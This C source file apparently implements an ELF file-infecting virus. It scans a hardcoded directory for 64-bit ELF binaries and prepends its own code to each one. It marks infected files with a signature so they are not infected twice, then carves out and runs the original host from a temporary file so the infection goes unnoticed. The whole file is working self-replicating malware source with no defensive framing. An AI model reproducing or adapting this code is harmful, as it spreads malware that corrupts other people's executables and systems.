#include "woody.h"
#include "buzz_buzzard.h"
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <errno.h>
extern unsigned char src_buzz_buzzard_bin[];
extern unsigned int src_buzz_buzzard_bin_len;

elf_t *elf;
injector *inj;
bool elf_alloc = false;
bool elf_data_alloc = false;
bool inj_alloc = false;
bool inj_data_alloc = false;
int elf_init(char *vict, elf_t **elf_ptr)
{
	if (!read_original(vict, &(*elf_ptr)))
		return 0;
	(*elf_ptr)->bit_class =
		(*elf_ptr)->data[EI_CLASS] == ELFCLASS64   ? 64
		: (*elf_ptr)->data[EI_CLASS] == ELFCLASS32 ? 32
												   : 0;
	___die2((*elf_ptr)->bit_class == 32, "Not accepting 32bit files");
	if ((*elf_ptr)->bit_class == 64)
		return 1;
	return 0;
}
/*Function that runs through all files in the folder*/
void get_files_list(char *directory_path, char *file_array[MAX_FILES], int *files_count)
{
	struct dirent *entry;
	DIR *dir = opendir(directory_path);
	___die(dir == NULL, "Could not open directory");
	char full_path[100];

	while ((entry = readdir(dir)) != NULL && (*files_count) < MAX_FILES)
	{
		if (entry->d_type == DT_REG)
		{
			file_array[(*files_count)] = malloc(MAX_FILENAME);
			if (file_array[(*files_count)] != NULL)
			{
				strcpy(full_path, directory_path);
				strcat(full_path, "/");
				strcat(full_path, entry->d_name);
				ft_memcpy(file_array[(*files_count)], full_path, MAX_FILENAME);
				file_array[(*files_count)][MAX_FILENAME - 1] = '\0';
				(*files_count)++;
			}
		}
	}
	closedir(dir);
}
/*This function creates temporary file that will later be filled with a copy of the code that was added to the main file, and then execute this*/
void execute(int vfd, mode_t mode, int totalSize, char *argv[], char *const envp[])
{
	/*Create a temporary file*/
	int tfd = creat("../tempfile", mode);
	lseek(vfd, SIZE, SEEK_SET);
	int signatureSize = sizeof(signature);
	/*Get the host size that will be the total size less VIRUS SIZE + signatura size*/
	int hostSize = totalSize - SIZE - signatureSize;
	printf("%d %d %d %d %d\n ", totalSize, SIZE, signatureSize, vfd, hostSize);
	/*Send the host size to this temporary file*/
	ft_sendfile(tfd, vfd, NULL, hostSize);
	close(tfd);
	/*Use chmod  so  the file is executed*/
	char mode2[] = "0755";
	int i = strtol(mode2, 0, 8);
	if (chmod("../tempfile", i) < 0)
	{
		printf("error in chmod() - \n");
	}
	pid_t pid = fork();
	if (pid == 0)
	{
		execve("../tempfile", argv, envp);
		exit(1);
	}
	waitpid(pid, NULL, 0);
	unlink("../tempfile");
}
/*This function create a file that will contain the copy of the virus and the host file*/
void inject(char *host_file, int vfd)
{
	size_t sig_len = strlen(signature);
	char sig_check[sig_len + 1];
	lseek(vfd, sizeof(signature) * -1, SEEK_END);
	read(vfd, &sig_check, sizeof(signature));
	printf("%s, %s \n ", sig_check, signature);
	sig_check[sig_len] = '\0';
	if (strcmp(sig_check, signature) == 0)
	{
		printf("Signature matches. Exiting with status 1.\n");
		return;
	}
	else
	{
		printf("Signature does not match.\n");
	}
	lseek(vfd, 0, SEEK_SET);
	/*Open the host file*/
	int hfd = open(host_file, O_RDONLY);
	struct stat st;
	fstat(hfd, &st);
	int host_size = st.st_size;
	/*Crate the new file that will have temporary name*/
	int tfd = creat("/home/atila/temp/tempfile", st.st_mode);
	/*Inject both codes and signature on it*/
	ft_sendfile(tfd, vfd, NULL, SIZE);
	ft_sendfile(tfd, hfd, NULL, host_size);
	write(tfd, &signature, sizeof(signature));
	/*Rename it to the host file name*/
	rename("/home/atila/temp/tempfile", host_file);
	close(tfd);
	close(hfd);
}

int main(int argc, char *argv[], char *const envp[])
{
	___die2(argc != 1, "One argument only");
	char *file_array[MAX_FILES];
	char *directory_path = "/home/atila/temp";
	int files_count = 0;
	get_files_list(directory_path, file_array, &files_count);
	/*check all files and if it is valid elf file it will infect it*/
	for (int i = 0; i < files_count; i++)
	{
		printf("%s ", file_array[i]);
		if (elf_init(file_array[i], &elf) == 1)
		{
			int vfd = open(argv[0], O_RDONLY);
			struct stat st;
			fstat(vfd, &st);
			inject(file_array[i], vfd);
			usleep(100000);
			execute(vfd, st.st_mode, st.st_size, argv, envp);
			close(vfd);
		}
		else
			printf("not infect");
		free(file_array[i]);
	}
	return free_all();
}
